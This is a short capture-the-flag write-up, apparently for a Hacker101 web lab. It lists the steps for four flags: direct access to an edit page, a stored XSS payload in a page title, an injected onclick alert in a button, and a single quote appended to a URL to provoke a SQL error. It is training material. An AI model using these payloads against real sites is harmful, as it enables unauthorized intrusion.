# Flag 1
https://ec980f8824c3c416b995aea996497976.ctf.hacker101.com/page/edit/6 -> flag
![](./images/1.png)
# Flag 2
create page and use XSS payload on title
<script>alert("xss")</script> 
when going back home, get flag

![](./images/2.png)
# Flag 3
on page 2, edit -> https://ec980f8824c3c416b995aea996497976.ctf.hacker101.com/page/edit/2

change the button to this:
<button onclick=alert("pwned")>Some button</button>

popup with alert appears, now go to source code and flag is there
![](./images/3.png)

# Flag 4
add a single quote on the edit url
https://ec980f8824c3c416b995aea996497976.ctf.hacker101.com/page/edit/2'

![](./images/4.png)